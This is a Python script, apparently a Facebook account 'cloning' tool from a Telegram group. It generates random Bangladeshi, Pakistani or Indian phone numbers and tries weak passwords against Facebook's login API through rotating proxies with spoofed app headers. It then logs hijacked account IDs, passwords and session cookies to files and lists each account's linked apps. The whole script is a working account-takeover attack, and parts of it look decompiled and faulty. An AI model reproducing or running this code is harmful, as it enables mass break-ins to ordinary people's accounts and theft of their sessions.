#===========< SEND BY : KALYAN KING]
#===========[ TG :OX CYBER ]
import os
import time
import random
import string
import re
import sys
import requests
import json
import uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from rich.progress import track

# Color and style variables
B = '\x1b[1;90m'
R = '\x1b[1;91m'
G = '\x1b[1;92m'
H = '\x1b[1;93m'
BL = '\x1b[1;94m'
BG = '\x1b[1;95m'
S = '\x1b[1;96m'
W = '\x1b[1;97m'
EX = '\x1b[0m'
E = '\x1b[m'
A = '\x1b[1;34m'
Y = '\x1b[1;33m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
M = '\x1b[38;5;205m'
dt = '•'

# Global lists and counters
id = []
ok = []
cp = []
twf = []
lop = 0
xode = []
plist = []
cpx = []
cokix = []
apkx = []
paswtrh = []
rcd = []
rcdx = []
lk = []

# Pre-defined strings for UI
BDX = f"{A}BD SIM CODE : {G}017 015 018 019 013 016{E}{W}"
INDX = f"{R}IND SIM CODE : {G}9670 9725 8948 8795 6383{E}{W}"
PAKX = f"{G}PAK SIM CODE : {G}0306 0315 0335 0345 0318{E}{W}"
LIMITX = f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}15000{W},{G}20000{W}"
CPG = f"[{G}~{W}] Do you went show cp account (y/n)"
CKIG = f"[{G}~{W}] Do you went show cookie (y/n)"
chc = f"{W}[{G}~{E}] Choice : {G}"
flp = f"{W}[{G}•{W}] PUT FILE PATH\x1b[1;37m : {G}"
chcps = f"EXAMPLE: {G}first123{W},{G}last123{W},{G}firstlast{W},{G}name{W}"
mxxt = f"{W}[{G}A{W}] METHOD [{G}1{W}]\n{W}[{G}B{W}] METHOD [{G}2{W}]\n{W}[{G}C{W}] METHOD [{G}3{W}]"
nflp = f"[{R}!{W}] FILE LOCATION NOT FOUND "

# Update and fetch resources
try:
    os.system('git pull')
except:
    pass

try:
    proxylist = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    with open('socksku.txt', 'w') as f:
        f.write(proxylist)
except Exception:
    pass

proxsi = open('socksku.txt', 'r').read().splitlines()

os.system('espeak -a 300 "well,come to, siam , scamer,  vip, Fuck,kalyan king Free sceipt give "')
SIAM_POWER_OF_ID = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/UA-UP/refs/heads/main/uax.txt').text.splitlines()

def line():
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def uxa():
    END = '[FBAN/FB4A;FBAV/460.0.0.34.89;FBBV/588414891;FBDM/{density=2.0,width=720,height=1406};FBLC/en_US;FBRV/0;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';' + END
    return ua

def clear():
    os.system('clear')

def server():
    try:
        database = requests.get('https://raw.githubusercontent.com/SIAM-TEAM-143/Server/refs/heads/main/Server.txt').text
        if 'on' in database:
            return
        elif 'off' in database:
            print(' [✓] TOOL IS OFF')
            sys.exit()
        elif 'update' in database:
            print(' [✓] TOOL IS UPDATE ')
            sys.exit()
        else:
            while True:
                print(' TOOL IS ON UPDATE')
    except:
        print(' Internet Error [✓] ')
        sys.exit()

server()
clear()
print('[✓]\x1b[34;1m TOOL IS ON')


def cek_apk(kuki):
    session = requests.Session()
    w = session.get('https://p.facebook.com/settings/apps/tabbed/?tab=active', cookies={'cookie': 'noscript=1;' + kuki}).text
    # The original code seems to have an issue here.
    # It imports bs4 but doesn't seem to use it correctly in the provided disassembly.
    # Reconstructing based on the bytecode.
    try:
        import bs4
        sop = bs4.BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method='post')
        game = [i.text for i in x.find_all('h3')]
        for i in range(len(game)):
            print(f'\r  \x1b[0m➛ {H}{game[i].replace("Added on", " Added on")}')
    except AttributeError:
        print(f'\r    {M}\x1b[0m cookie invalid')
    
    try:
        w = session.get('https://p.facebook.com/settings/apps/tabbed/?tab=inactive', cookies={'cookie': 'noscript=1;' + kuki}).text
        import bs4
        sop = bs4.BeautifulSoup(w, 'html.parser')
        x = sop.find('form', method='post')
        game = [i.text for i in x.find_all('h3')]
        for i in range(len(game)):
            print(f'\r  \x1b[0m➛ {game[i].replace("Expired", " Expired")}')
    except AttributeError:
        print(f'\r    {M} \x1b[0mcookie invalid')

def logo():
    os.system('clear')
    os.system("https://t.me/+LRlET_sIrUcxMTk1")
    os.system("https://t.me/+LRlET_sIrUcxMTk1")
    print("".join([
        '\r\r\x1b[1;97m', f'{W}',
        '\n   _|_|_|  _|_|_|    _|_|    _|      _|  \n _|          _|    _|    _|  _|_|  _|_|  \n   _|_|      _|    _|_|_|_|  _|  _|  _|  \n       _|    _|    _|    _|  _|      _|  \n _|_|_|    _|_|_|  _|    _|  _|      _|  \n                                                                               \n',
        f'{R}', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n',
        f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'SEND BY   ', f'{R}', ' >>   ', f'{A}', ' KALYAN KING\n',
        f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'TELIGERM       ', f'{R}', '>>   ', f'{A}', ' OX CYBER TEAM\n',
        f'{A}', '[', f'{R}', '=', f'{A}', '] ', f'{G}', 'VERSION   ', f'{R}', '  >>   ', f'{A}', '20.3x\n',
        f'{G}', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
    ]))

def Main():
    logo()
    print(f"{G}[{R}1{G}]{A} BANGLADESH CLONE")
    print(f"{G}[{R}2{G}]{A} PAKISTAN CLONE")
    print(f"{G}[{R}3{G}]{A} INDIA CLONE")
    line()
    ghx = input(f' ~/>>Choice >>>>: {G}')
    if ghx in ('A', 'a', '1'):
        rcd.append('1')
        rmenu1()
    elif ghx in ('B', 'b', '2'):
        rcd.append('2')
        rmenu1()
    elif ghx in ('C', 'c', '3'):
        rcd.append('3')
        rmenu1()
    else:
        line()
        print(f'\n \t {R}Choose valid option{E}')
        time.sleep(1)
        Main()

def rmenu1():
    logo()
    if '1' in rcd:
        print(f'{BDX}')
        line()
    if '2' in rcd:
        print(f'{PAKX}')
        line()
    if '3' in rcd:
        print(f'{INDX}')
        line()
        
    code = input(f'{chc}')
    print(f'{G}----------------------------------------')
    print(f'{LIMITX}')
    line()
    limit = int(input(f'[{G}+{E}] Limit : {G}'))
    print(f'{G}----------------------------------------')
    print(f'{CPG}')
    line()
    cx = input(f'[{chc}')
    if cx in ('n', 'N', 'no', 'NO', '2'):
        cpx.append('n')
    else:
        cpx.append('y')
    print(f'{W}----------------------------------------')
    print(f'{CKIG}')
    line()
    ckiv = input(f'[{chc}')
    if ckiv in ('n', 'N', 'no', 'NO', '2'):
        cokix.append('n')
    else:
        cokix.append('y')
        
    for number in range(limit):
        if '1' in rcd:
            numberx = "".join(random.choice(string.digits) for _ in range(8))
            xode.append(numberx)
        elif '2' in rcd:
            numberx = "".join(random.choice(string.digits) for _ in range(7))
            xode.append(numberx)
        elif '3' in rcd:
            numberx = "".join(random.choice(string.digits) for _ in range(6))
            xode.append(numberx)
            
    with ThreadPool(max_workers=60) as smrn:
        tid = str(len(xode))
        logo()
        print(f' [{G}•{W}] TOTAL ID :\x1b[1;92m {tid}')
        print(f' {W}[{G}•{W}] \x1b[1;97m{G}SIM CODE : \x1b[1;92m{code}')
        print(f' {W}[{G}•{W}] \x1b[1;37m{R}THE PROCESS HAS BEEN STARTED')
        print(f' [{G}•{W}] \x1b[1;37m{A}USE AEROPLANE MODE IN EVERY 5 MIN ')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for rngx in xode:
            id = code + rngx
            if '1' in rcd:
                psd = [id, rngx, id[:6], id[:7], id[:8], id[5:]]
            elif '2' in rcd:
                psd = [id, rngx, id[5:], 'khan123']
            elif '3' in rcd:
                psd = [id, rngx, id[:6], '57273200']
            smrn.submit(M1X, id, psd, tid)
    return

def M1X(id, psd, tid):
    global lop, ok, cp
    togg = []
    rx = random.choice([G, X, R, Y, A, B])
    cc = random.choice([B, A, R, X, Y, G])
    rr = random.choice([R, Y, G, B, A, X])
    mm = random.choice([G, R, A, Y, B, X])
    
    sys.stdout.write("".join([
        '\r\r[<', f'{rx}', '±', f'{G}', '>]   ', f'{G}', '[', f'{rx}', 'S', f'{cc}', 'I', f'{rr}', 'A', f'{rx}', 'M', f'{G}', '] 🎗️ ', f'{G}', '[', f'{rx}', f'{lop}', f'{G}', '] 🎀 OK : ', f'{X}', f'{len(ok)}', ' 💥 ', f'{G}', 'CP : ', f'{R}', f'{len(cp)}', ' '
    ]))
    sys.stdout.flush()
    
    for psw in psd:
        try:
            xx = open('Proksi.txt', 'r').read().splitlines()
            zz = {'http': 'socks4://' + random.choice(xx)}
            
            vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
            VAPP = random.randint(410000000, 499999999)
            
            ua = (f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; '
                  f'{str(random.choice(proxsi))} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) '
                  '[FBAN/FB4A;FBAV/347.0.0.3.161;FBBV/229145646;FBDM/{density=3.3,width=1080,height=1430};FBLC/en_GB;FBRV/859351995;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]')

            datax = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': id,
                'password': psw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_GB',
                'client_country_code': 'GB',
                'fb_api_req_friendly_name': 'authenticate'
            }

            header = {
                'User-Agent': usx(),
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'
            }

            twfx = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, proxies=zz, allow_redirects=False).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ";".join(f"{key}={value}" for key, value in ck.items())
                iid = re.findall('c_user=(.*);xs', coki)[0]
                
                print(f'\r\r{G}[SIAM-OK] {iid} | {psw}{W}')
                os.system('espeak -a 300 "ok id"')
                ok.append(id)
                with open('/sdcard/SIAM-OK.txt', 'a') as f:
                    f.write(f'{iid} | {psw}--->>>{coki}\n')
                if 'y' in cokix:
                    print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {rx}{coki}{E}')
                    print(f'{W}---------------------------------------------{E}')
                cek_apk(coki)
                break
            
            elif twfx in str(lo):
                iid = lo['error']['error_data']['uid']
                print(f'\r\r{BL}[SIAM-2F] {iid} | {psw}{W}')
                os.system('espeak -a 300 "two,f id"')
                with open('/sdcard/SIAM-2F.txt', 'a') as f:
                    f.write(f'{iid} | {psw}\n')
                twf.append(id)
                break
                
            elif 'www.facebook.com' in lo['error']['message']:
                try:
                    iid = lo['error']['error_data']['uid']
                    if iid in ok:
                        break
                    if 'y' in cpx:
                        print(f'\r\r{S}[SIAM-CP] {iid} | {psw}{W}')
                        cp.append(id)
                        os.system('espeak -a 300 "cp id"')
                        with open('/sdcard/SIAM-CP.txt', 'a') as f:
                            f.write(f'{iid} | {psw}\n')
                    break
                except:
                    iid = id
                    
        except:
            pass
            
    lop += 1

def usx():
    wr = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36'
    nt = 'Mozilla/5.0 (Linux; Android 13; 2201116TI Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.90 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/512.0.0.54.109;]'
    win = 'Mozilla/5.0 (Linux; Android 13; 2201116TG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/137.0.7151.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/512.0.0.54.109;]'
    uamax = random.choice(['wr', 'nt', 'win'])
    return uamax

if __name__ == '__main__':
    Main()